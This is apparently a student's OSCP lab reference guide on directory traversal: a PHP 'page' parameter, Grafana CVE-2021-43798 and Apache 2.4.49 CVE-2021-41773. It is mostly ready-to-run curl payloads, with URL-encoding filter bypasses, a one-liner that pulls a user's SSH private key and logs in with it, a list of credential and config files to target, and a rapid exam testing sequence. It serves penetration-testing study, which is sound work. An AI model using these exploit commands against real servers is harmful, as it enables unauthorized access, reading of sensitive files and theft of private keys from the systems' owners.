# Grafana & Apache Directory Traversal Reference Guide

## Attack Chain Summary

### Target 1: Mountain Desserts (PHP Application)
**IP**: 192.168.187.16
**Service**: Web application with PHP
**Vulnerability**: Basic directory traversal in `page` parameter
**Outcome**: SSH access via stolen private key

### Target 2: Grafana CVE-2021-43798
**IP**: 192.168.187.16:3000
**Service**: Grafana monitoring dashboard
**Vulnerability**: Unauthenticated directory traversal via plugin paths
**Outcome**: Retrieved flag from `/opt/install.txt`

### Target 3: Apache 2.4.49 CVE-2021-41773
**IP**: 192.168.187.16
**Service**: Apache HTTP Server 2.4.49
**Vulnerability**: Path normalization bypass using URL encoding
**Outcome**: Attempted but file not found (wrong target/path)

## Detailed Exploitation Steps

### 1. Mountain Desserts - Basic Directory Traversal

```bash
# Step 1: Identify vulnerable parameter
curl "http://mountaindesserts.com/meteor/index.php?page=admin.php"

# Step 2: Test traversal with /etc/passwd
curl "http://mountaindesserts.com/meteor/index.php?page=../../../../../etc/passwd"

# Step 3: Extract SSH key
curl "http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa" > dt_key

# Step 4: Fix permissions and connect
chmod 400 dt_key
ssh -i dt_key -p 2222 offsec@192.168.187.16

# Flag: OS{25601f75a1fa6ac8704f8daf15d9513b}
```

### 2. Grafana CVE-2021-43798 - Plugin Path Traversal

```bash
# CRITICAL: Must use --path-as-is flag
# Without it, curl normalizes ../ sequences and exploit fails

# Working exploit (Linux target at /opt/install.txt)
curl --path-as-is "http://192.168.187.16:3000/public/plugins/welcome/../../../../../../../../../opt/install.txt"

# Flag: OS{eda771896f5dac1ac3764e44543cd1e4}

# Alternative: Python exploit script
python3 grafana_exploit.py -H http://192.168.187.16:3000
# Then input: /opt/install.txt
```

### 3. Apache 2.4.49 CVE-2021-41773 - Encoding Bypass

```bash
# Various encoding patterns tested:
# 1. Double URL encoding
curl "http://192.168.187.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 2. Mixed encoding (.%2e)
curl --path-as-is "http://192.168.187.16/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# 3. Unicode encoding (%%32%65 = .)
curl --path-as-is "http://192.168.187.16/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
# This pattern worked for /etc/passwd retrieval
```

## Key Lessons Learned

### 1. The --path-as-is Flag is CRITICAL
- **Problem**: Browsers and curl automatically normalize `../` sequences
- **Solution**: Use `curl --path-as-is` to preserve exact path
- **When to use**: Grafana CVE-2021-43798, Apache CVE-2021-41773, any traversal requiring exact path preservation

### 2. Encoding Bypass Patterns
```bash
# Standard traversal (often blocked)
../../../etc/passwd

# URL encoding (bypass basic filters)
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Mixed encoding (bypass smarter filters)
.%2e/.%2e/.%2e/etc/passwd

# Double encoding (when single encoding is decoded and checked)
%252e%252e%252f  # Becomes %2e%2e%2f after first decode

# Unicode/special encoding (Apache 2.4.49 specific)
.%%32%65  # Single % before encoded values
```

### 3. Target Identification Matters
- Check if Linux or Windows (try both `/etc/passwd` and `C:\Windows\System32\drivers\etc\hosts`)
- Verify service versions (Grafana version, Apache version)
- Understand the web root location for proper traversal depth

### 4. Common High-Value Files

**Linux Targets**:
```bash
/etc/passwd                          # User enumeration
/home/[user]/.ssh/id_rsa            # SSH keys
/var/www/html/config.php            # Web configs
/opt/[appname]/config.ini           # Application configs
/proc/self/environ                   # Environment variables
/var/log/apache2/access.log         # Logs for poisoning
```

**Windows Targets**:
```bash
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Users\[username]\Desktop\*.txt
C:\Program Files\[app]\config.ini
```

### 5. Traversal Depth Calculation
- Start with 5-10 `../` sequences
- Adjust based on typical web root locations:
  - Linux: `/var/www/html/` = 4 directories deep
  - Windows: `C:\inetpub\wwwroot\` = 3 directories deep
- Add extra traversals to ensure you reach root (extras are ignored)

## Troubleshooting Guide

### Issue: "Plugin file not found" (Grafana)
**Causes**:
1. Wrong plugin name
2. Plugin doesn't exist in this version
3. Path normalization occurring

**Solutions**:
- Try different plugins: welcome, alertlist, graph, dashlist
- Ensure using `--path-as-is` flag
- Check Grafana version compatibility

### Issue: 404 on Known Files
**Causes**:
1. Incorrect traversal depth
2. Filtering in place
3. File doesn't exist
4. Wrong encoding method

**Solutions**:
- Try different depths (5-15 ../s)
- Try various encoding methods
- Verify file exists with simpler traversal first
- Check if service is on expected port

### Issue: SSH Key Won't Work
**Causes**:
1. Wrong permissions
2. Wrong port
3. Wrong username
4. Key has passphrase

**Solutions**:
```bash
chmod 400 keyfile  # MANDATORY
ssh -i keyfile -p PORT user@host
# Try common ports: 22, 2222, 22222
# Try common users from /etc/passwd
```

## OSCP Exam Strategy

### 1. Quick Identification
```bash
# Look for these patterns in URLs
?page=file.php
?file=document.pdf
?path=/var/www
?template=main
/public/plugins/
/cgi-bin/
```

### 2. Rapid Testing Sequence
```bash
# 1. Test basic traversal
curl "http://target/?page=../../../../etc/passwd"

# 2. If blocked, try encoding
curl "http://target/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# 3. If Grafana detected
curl --path-as-is "http://target:3000/public/plugins/welcome/../../../../../../etc/passwd"

# 4. If Apache 2.4.49
curl --path-as-is "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```

### 3. Documentation Requirements
- Screenshot the vulnerable URL
- Show successful file retrieval
- Document exact commands used
- Include flag/proof in screenshot
- Note any special flags like --path-as-is

## Quick Command Reference

```bash
# Grafana CVE-2021-43798 (MUST use --path-as-is)
curl --path-as-is http://target:3000/public/plugins/welcome/../../../../../../../etc/passwd

# Apache 2.4.49 CVE-2021-41773
curl --path-as-is http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd

# Basic PHP traversal
curl http://target/index.php?page=../../../../../etc/passwd

# Windows traversal
curl http://target/index.php?page=..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts

# SSH key retrieval and usage
curl "http://target/?page=../../../../../home/user/.ssh/id_rsa" > key && chmod 400 key && ssh -i key user@target
```

## Exploit Scripts Created

### 1. grafana_exploit.py
- Interactive file reading
- Randomizes plugin selection
- Handles session management
- Located at: `/home/kali/OSCP/grafana_exploit.py`

### 2. apache_exploit.sh
- Tests multiple encoding patterns
- Attempts both traversal and RCE
- Located at: `/home/kali/OSCP/apache_exploit.sh`

## Final Tips

1. **Always try --path-as-is first** when using curl for traversals
2. **Document everything** - failed attempts teach valuable lessons
3. **Check both Linux and Windows paths** if OS is unknown
4. **Verify services** with banner grabbing before assuming versions
5. **Keep this reference handy** during exam for quick lookups

---
*Reference compiled from practical exploitation of OSCP lab machines*
*Last updated: During active exploitation session*